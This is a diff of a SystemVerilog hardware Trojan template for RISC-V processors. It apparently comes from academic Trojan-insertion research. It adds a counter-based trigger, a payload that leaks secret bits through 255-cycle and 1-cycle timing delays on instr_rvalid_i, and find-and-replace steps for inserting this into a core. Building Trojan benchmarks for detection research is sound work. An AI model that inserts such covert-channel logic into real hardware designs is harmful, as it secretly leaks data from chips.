@@ -1,64 +1,76 @@
 /**
- * Hardware Trojan Template: Covert Channel (Timing-Based)
+ * Sequential Covert Channel Trojan - Code Snippet
  * 
- * Category: Sequential Logic
- * Pattern Type: Covert Channel / Timing Side-Channel
- * 
- * Source: Lipp et al. (2021), Lin et al. (2009)
- * Reference:
- *   [1] M. Lipp et al., "Tapeout of RISC-V crypto chip with hardware trojans," ACM CF 2021
- *   [2] L. Lin et al., "Trojan Side-Channels," CHES 2009
+ * Trust-Hub Status: Related to Leak Information (power only, not timing)
+ * Literature Sources: Kocher 1996, Lipp et al. 2021, Lin et al. 2009
  * 
  * Description:
- *   Creates hidden timing-based communication channel.
- *   Encodes secret data through timing variations (long delay = 1, short = 0).
- *
- * RISC-V Adaptation:
- *   Observable timing paths in RISC-V processors
- *
- * Author: Sharjeel Imtiaz (Tallinn University of Technology)
+ *   Creates timing-based covert channel
+ *   
+ * Trigger: Counter on instr_rdata_i
+ * Payload: Modulate timing of instr_rvalid_i based on secret data
+ * 
+ * Author: Sharjeel Imtiaz (TalTech)
  * Date: January 2026
  */
 
-module instantiates_trojan (
-    input  logic clk_i,
-    input  logic rst_ni,
-    
-    input  logic {{SECRET_BIT}},
-    input  logic {{NORMAL_READY}},
-    output logic {{MODULATED_READY}}
-);
+// ============================================================
+// TROJAN TRIGGER LOGIC (Counter-based)
+// ============================================================
 
-    localparam int DELAY_LONG = 255;
-    localparam int DELAY_SHORT = 1;
-    
-    logic [7:0] timing_counter;
-    logic timing_modulation_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            timing_counter <= '0;
-            timing_modulation_active <= 1'b0;
-        end else begin
-            if ({{NORMAL_READY}}) begin
-                if ({{SECRET_BIT}}) begin
-                    timing_counter <= DELAY_LONG;
-                end else begin
-                    timing_counter <= DELAY_SHORT;
-                end
-                timing_modulation_active <= 1'b1;
-            end
-            
-            if (timing_counter > 0) begin
-                timing_counter <= timing_counter - 1;
-            end else begin
-                timing_modulation_active <= 1'b0;
-            end
+localparam int TRIGGER_THRESHOLD = 1000;
+logic [31:0] trojan_counter;
+logic trojan_active;
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        trojan_counter <= '0;
+        trojan_active  <= 1'b0;
+    end else begin
+        if (instr_rdata_i) begin
+            trojan_counter <= trojan_counter + 1;
+        end
+        
+        if (trojan_counter >= TRIGGER_THRESHOLD) begin
+            trojan_active <= 1'b1;
         end
     end
-    
-    assign {{MODULATED_READY}} = timing_modulation_active ? 
-                                 1'b0 : 
-                                 {{NORMAL_READY}};
+end
 
-endmodule
+// ============================================================
+// PAYLOAD: Timing Covert Channel
+// ============================================================
+
+// Timing modulation based on secret bit
+logic [7:0] timing_delay;
+logic secret_bit;
+
+// Extract secret bit from payload signal (LSB)
+assign secret_bit = instr_rvalid_i[0];
+
+always_ff @(posedge clk_i or negedge rst_ni) begin
+    if (!rst_ni) begin
+        timing_delay <= '0;
+    end else if (trojan_active) begin
+        // Long delay for bit '1', short for bit '0'
+        timing_delay <= secret_bit ? 8'd255 : 8'd1;
+    end else if (timing_delay > 0) begin
+        timing_delay <= timing_delay - 1;
+    end
+end
+
+// ============================================================
+// PAYLOAD MODIFICATION INSTRUCTIONS
+// ============================================================
+// Covert Channel: Modulate timing of instr_rvalid_i
+//
+// Integration Script Must Modify:
+//
+// IF instr_rvalid_i is timing-sensitive:
+//   Find: assign instr_rvalid_i = ready_signal;
+//   Replace: assign instr_rvalid_i = (timing_delay == 0) ? ready_signal : 1'b0;
+//
+// This creates observable timing variations:
+//   - Bit '1': 255 cycle delay
+//   - Bit '0': 1 cycle delay
+//   - Timing difference reveals secret data bit-by-bit
